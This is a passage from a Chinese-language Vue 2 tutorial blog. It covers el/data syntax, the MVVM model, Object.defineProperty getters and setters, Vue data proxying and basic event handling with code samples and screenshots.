&#125;<br>    &#125;)<br>  &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h3 id="1-6-el与data的两种写法"><a href="#1-6-el与data的两种写法" class="headerlink" title="1.6 el与data的两种写法"></a>1.6 el与data的两种写法</h3><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/2.gif" srcset="/img/loading.gif" lazyload style="zoom:67%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>      &lt;h1&gt;你好，&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt;<br>  &lt;&#x2F;div&gt;<br><br>&lt;&#x2F;body&gt;<br>  &lt;script&gt;<br>    Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>      &#x2F;&#x2F;   el:&#39;#root&#39;,<br>        data:&#123;<br>            name: &#39;Mike Taylor&#39;<br>        &#125;<br>    &#125;)<br>    console.log(v);<br>    setTimeout(()&#x3D;&gt;&#123;<br>      vm.$mount(&#39;#root&#39;); &#x2F;&#x2F; 挂载<br>    &#125;,1000)<br>  &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">   &lt;body&gt;<br>   &lt;!--准备一个容器--&gt;<br>   &lt;div id&#x3D;&quot;root&quot;&gt;<br>       &lt;h1&gt;你好，&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt;<br>   &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>   &lt;script&gt;<br>     Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>     const v &#x3D; new Vue(&#123;<br>       &#x2F;&#x2F;   data:function()&#123;<br>         data()&#123;<br>             console.log(&#39;@@@&#39;,this); &#x2F;&#x2F; 此处的this是Vue实例对象<br>             return &#123;<br>                 name: &#39;Mike Taylor&#39;<br>             &#125;<br>         &#125;<br>     &#125;)<br>     setTimeout(()&#x3D;&gt;&#123;<br>       v.$mount(&#39;#root&#39;); &#x2F;&#x2F; 挂载<br>     &#125;,1000)<br>   &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li><p>组件复用data必须为函数</p>
</li>
<li><p>data与el的两种写法</p>
<ul>
<li>el的两种写法<ul>
<li>new Vue的时候配置el属性</li>
<li>先创建Vue实例。随后再通过vm.$mount(‘#root’)指定el的值</li>
</ul>
</li>
<li>data的两种写法<ul>
<li>对象式</li>
<li>函数式</li>
<li>选择：目前都可以使用，但是学习了组件后，data必须使用函数式，否则会报错</li>
</ul>
</li>
<li>重要原则<ul>
<li><strong>由VUE管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是VUE实例了（而是Windows实例）</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-7-理解MVVM模型"><a href="#1-7-理解MVVM模型" class="headerlink" title="1.7 理解MVVM模型"></a>1.7 理解MVVM模型</h3><ul>
<li>M：模型(Model) ：对应 data 中的数据 </li>
<li>sV：视图(View) ：模板代码</li>
<li>VM：视图模型(ViewModel) ： Vue 实例对象</li>
</ul>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/3QVJ9_0BOABZ3%7BV23DAT1L9.png" srcset="/img/loading.gif" lazyload></p>
<p>此在文档中经常会使用 <code>vm</code> (ViewModel 的缩写) 这个变量名表示 Vue 实例。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727193618664.png" srcset="/img/loading.gif" lazyload alt="image-20210727193618664" style="zoom:80%;" />

<ul>
<li>观察发现：<ul>
<li>data中所有属性，最后都出现在了vm身上</li>
<li>vm身上所有属性及VUE原型上所有属性，在VUE模板中都可以直接使用</li>
</ul>
</li>
</ul>
<h3 id="1-8-回顾Object-defineProperty方法"><a href="#1-8-回顾Object-defineProperty方法" class="headerlink" title="1.8 回顾Object.defineProperty方法"></a>1.8 回顾Object.defineProperty方法</h3><p>回顾Object.defineProperty方法</p>
<p>作用：给对象添加/定义属性</p>
<h4 id="添加值"><a href="#添加值" class="headerlink" title="添加值"></a>添加值</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> person = &#123;</span><br><span class="javascript">            name:<span class="hljs-string">&#x27;Mike Taylor&#x27;</span>,</span><br><span class="javascript">            gender:<span class="hljs-string">&#x27;Man&#x27;</span>,</span><br>        &#125;<br><span class="javascript">        <span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;</span><br>            value: 20<br>        &#125;)<br><span class="javascript">        <span class="hljs-built_in">console</span>.log(person);</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727195314342.png" srcset="/img/loading.gif" lazyload alt="image-20210727195314342" style="zoom:80%;" />

<h4 id="age不可以被枚举（不参与遍历）"><a href="#age不可以被枚举（不参与遍历）" class="headerlink" title="age不可以被枚举（不参与遍历）"></a>age不可以被枚举（不参与遍历）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> person = &#123;</span><br><span class="javascript">            name:<span class="hljs-string">&#x27;Mike Taylor&#x27;</span>,</span><br><span class="javascript">            gender:<span class="hljs-string">&#x27;Man&#x27;</span>,</span><br><span class="javascript">            <span class="hljs-comment">// age: 20</span></span><br>        &#125;<br><span class="javascript">        <span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;</span><br>            value: 20<br>        &#125;)<br><span class="javascript">        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">Object</span>.keys(person)); <span class="hljs-comment">// 传入对象作为参数，可以把传入对象中所有属性的属性名提取出来，变成一个数组</span></span><br><span class="javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> person)&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;@@&#x27;</span>+person[index])</span><br>        &#125;<br><span class="javascript">        <span class="hljs-built_in">console</span>.log(person);</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>要实现枚举：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;<br>            value: <span class="hljs-number">20</span>,<br>            enumerable:<span class="hljs-literal">true</span>, <span class="hljs-comment">//控制属性值是否可以枚举，默认为false</span><br>        &#125;)<br></code></pre></td></tr></table></figure>

<h4 id="无法改变值"><a href="#无法改变值" class="headerlink" title="无法改变值"></a>无法改变值</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727200203049.png" srcset="/img/loading.gif" lazyload alt="image-20210727200203049" style="zoom: 67%;" />

<p>实现可改变：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;<br>            value: <span class="hljs-number">20</span>,<br>            enumerable:<span class="hljs-literal">true</span>,<br>            writtable:<span class="hljs-literal">true</span>, <span class="hljs-comment">// 控制属性是否可以被修改，默认为false</span><br>        &#125;)<br></code></pre></td></tr></table></figure>

<h4 id="不可删除其中的值"><a href="#不可删除其中的值" class="headerlink" title="不可删除其中的值"></a>不可删除其中的值</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727200849782.png" srcset="/img/loading.gif" lazyload alt="image-20210727200849782" style="zoom:80%;" />

<p>实现可删除：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;<br>            value: <span class="hljs-number">20</span>,<br>            enumerable:<span class="hljs-literal">true</span>,<br>            writtable:<span class="hljs-literal">true</span>, <br>            configurable: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 控制属性是否可以被删除，默认为false</span><br>        &#125;)<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727200923385.png" srcset="/img/loading.gif" lazyload alt="image-20210727200923385" style="zoom:80%;" />

<h4 id="实现age随变量的变化而动态变化"><a href="#实现age随变量的变化而动态变化" class="headerlink" title="实现age随变量的变化而动态变化"></a>实现age随变量的变化而动态变化</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727202150198.png" srcset="/img/loading.gif" lazyload alt="image-20210727202150198" style="zoom:80%;" />

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">    <span class="hljs-keyword">let</span> number = <span class="hljs-number">20</span>;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> person = &#123;</span><br><span class="javascript">            name:<span class="hljs-string">&#x27;Mike Taylor&#x27;</span>,</span><br><span class="javascript">            gender:<span class="hljs-string">&#x27;Man&#x27;</span>,</span><br>        &#125;<br><span class="javascript">        <span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;</span><br><span class="javascript">            <span class="hljs-comment">// 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值</span></span><br><span class="javascript">            get:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;有人读取age属性了！&quot;</span>);</span><br><span class="javascript">                <span class="hljs-keyword">return</span> number;</span><br>            &#125;<br>        &#125;)<br><span class="javascript">        <span class="hljs-built_in">console</span>.log(person);</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/3.gif" srcset="/img/loading.gif" lazyload alt="s" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727203205835.png" srcset="/img/loading.gif" lazyload alt="image-20210727203205835" style="zoom:80%;" />

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">    <span class="hljs-keyword">let</span> number = <span class="hljs-number">20</span>;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> person = &#123;</span><br><span class="javascript">            name:<span class="hljs-string">&#x27;Mike Taylor&#x27;</span>,</span><br><span class="javascript">            gender:<span class="hljs-string">&#x27;Man&#x27;</span>,</span><br>        &#125;<br><span class="javascript">        <span class="hljs-built_in">Object</span>.defineProperty(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;</span><br><span class="javascript">            <span class="hljs-comment">// 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值</span></span><br><span class="javascript">            <span class="hljs-function"><span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;有人读取age属性了！&quot;</span>);</span><br><span class="javascript">                <span class="hljs-keyword">return</span> number;</span><br>            &#125;,<br><span class="javascript">            <span class="hljs-comment">// 当有人修改person的age属性值时，set函数(setter)就会被调用，且会收到具体返回值</span></span><br><span class="javascript">            <span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">value</span>)</span>&#123;</span><br><span class="javascript">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;有人修改age属性，且值是：&quot;</span>,value);</span><br>            &#125;<br>        &#125;)<br><span class="javascript">        <span class="hljs-built_in">console</span>.log(person);</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>表面上更改了age属性，实际上并没有改掉，因为number没有变化</p>
<p>改正：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">value</span>)</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;有人修改age属性，且值是：&quot;</span>,value);<br>                number = value<br>            &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727203438179.png" srcset="/img/loading.gif" lazyload alt="image-20210727203438179" style="zoom: 80%;" />

<p>总结：age属性值现用现取</p>
<h3 id="1-9-理解数据代理"><a href="#1-9-理解数据代理" class="headerlink" title="1.9 理解数据代理"></a>1.9 理解数据代理</h3><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210727204159414.png" srcset="/img/loading.gif" lazyload alt="image-20210727204159414" style="zoom:80%;" />

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写） --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">100</span>&#125;;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> obj2 = &#123;<span class="hljs-attr">y</span>:<span class="hljs-number">200</span>&#125;;</span><br><br><span class="javascript">        <span class="hljs-built_in">Object</span>.defineProperty(obj2,<span class="hljs-string">&#x27;x&#x27;</span>,&#123;</span><br><span class="javascript">            get: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span> obj.x;</span><br>            &#125;,<br><span class="javascript">            set: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)</span>&#123;</span><br>                obj.x = value;<br>            &#125;<br>        &#125;);<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="1-10-Vue中的数据代理"><a href="#1-10-Vue中的数据代理" class="headerlink" title="1.10 Vue中的数据代理"></a>1.10 Vue中的数据代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;个人姓名：&#123;&#123;name&#125;&#125;&lt;&#x2F;h2&gt;<br>        &lt;h2&gt;住址：&#123;&#123;address&#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>        el:&#39;#root&#39;,<br>        data:&#123;<br>            name: &#39;张加林&#39;,<br>            address: &#39;成华区建设路&#39;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/5.gif" srcset="/img/loading.gif" lazyload alt="5"></p>
<p>当对vm进行访问的时候，getter开始工作，把别的地方(data)的name拿过来使用；当有人通过vm修改name，setter开始工作。读写都是使用的data中的属性</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/V%5DCU6QM1V8C7$%7D~G_F4%60XVX.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="需要验证"><a href="#需要验证" class="headerlink" title="需要验证"></a>需要验证</h4><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210825195800999.png" srcset="/img/loading.gif" lazyload alt="image-20210825195800999"></p>
<p>1.验证getter：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210825200211017.png" srcset="/img/loading.gif" lazyload alt="image-20210825200211017"></p>
<p>2.验证setter：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826145640373.png" srcset="/img/loading.gif" lazyload alt="image-20210826145640373" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826145856090.png" srcset="/img/loading.gif" lazyload alt="image-20210826145856090"></p>
<p>vm将data数据存储在自己内部，称为_data，通过_data可以访问name和address(不便于编码，所以用后者)；由于使用了数据代理，也可以直接访问name和address。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826151319527.png" srcset="/img/loading.gif" lazyload alt="image-20210826151319527" style="zoom:80%;" />

<p><em>注意_data和代码data并不相同，这里涉及到了数据劫持，后续会学习。（数据劫持的目的是为了实现一个功能：感知data中的数据被修改，并将修改结果更新展示在页面里，即<strong>响应式</strong>）</em></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> data = &#123;<br>        name: <span class="hljs-string">&#x27;张加林&#x27;</span>,<br>        address: <span class="hljs-string">&#x27;成华区建设路&#x27;</span><br>    &#125;;<br><br>    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;<br>        el: <span class="hljs-string">&#x27;#root&#x27;</span>,<br>        data<br>    &#125;)<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826151716719.png" srcset="/img/loading.gif" lazyload alt="image-20210826151716719"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826151747690.png" srcset="/img/loading.gif" lazyload alt="image-20210826151747690"></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826152355914.png" srcset="/img/loading.gif" lazyload alt="image-20210826152355914" style="zoom:80%;" />

<p>原因：<strong>一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新。</strong></p>
<h4 id="数据代理图示"><a href="#数据代理图示" class="headerlink" title="数据代理图示"></a>数据代理图示</h4><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826152738060.png" srcset="/img/loading.gif" lazyload alt="image-20210826152738060"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）</li>
<li>Vue中数据代理的好处：更加方便地操作data中的数据</li>
<li>基本原理：<ul>
<li>通过Object.defineProperty()把data对象中的所有属性添加到vm上。</li>
<li>为每一个添加vm上的属性，都指定一个getter和setter。</li>
<li>在getter/setter内部去操作（读/写）data中对应的属性。</li>
</ul>
</li>
</ul>
<h3 id="1-11-事件处理"><a href="#1-11-事件处理" class="headerlink" title="1.11 事件处理"></a>1.11 事件处理</h3><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160001338.png" srcset="/img/loading.gif" lazyload alt="image-20210826160001338" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;button v-on:click&#x3D;&quot;showInfo&quot;&gt;点击跳转&lt;&#x2F;button&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123; &#x2F;&#x2F;配置事件的回调<br>            showInfo() &#123;<br>                &#x2F;&#x2F; 对象中配置方法：直接使用方法名即可。<br>                alert(&#39;Mike Taylor&#39;)<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160101734.png" srcset="/img/loading.gif" lazyload alt="image-20210826160101734" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160114098.png" srcset="/img/loading.gif" lazyload alt="image-20210826160114098"></p>
<p>点击按钮，调用showInfo函数，所以a为返回的事件对象，下面是event的target。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160439248.png" srcset="/img/loading.gif" lazyload alt="image-20210826160439248" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160422705.png" srcset="/img/loading.gif" lazyload alt="image-20210826160422705" style="zoom:80%;" />

<p>showInfo中的this的含义：此处this就是vm</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160540680.png" srcset="/img/loading.gif" lazyload alt="image-20210826160540680"></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826160841914.png" srcset="/img/loading.gif" lazyload alt="image-20210826160841914" style="zoom: 80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826161630609.png" srcset="/img/loading.gif" lazyload alt="image-20210826161630609" style="zoom: 80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826161535580.png" srcset="/img/loading.gif" lazyload alt="image-20210826161535580"></p>
<p>易错易混：箭头函数this指向Windows</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826162100284.png" srcset="/img/loading.gif" lazyload alt="image-20210826162100284" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826162213254.png" srcset="/img/loading.gif" lazyload alt="image-20210826162213254"></p>
<p>因此，我们遵循原则：接受Vue管理的函数，最好都写成普通函数。</p>
<p>事件绑定的简写形式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点击跳转<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>功能需求：事件触发后，传参。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        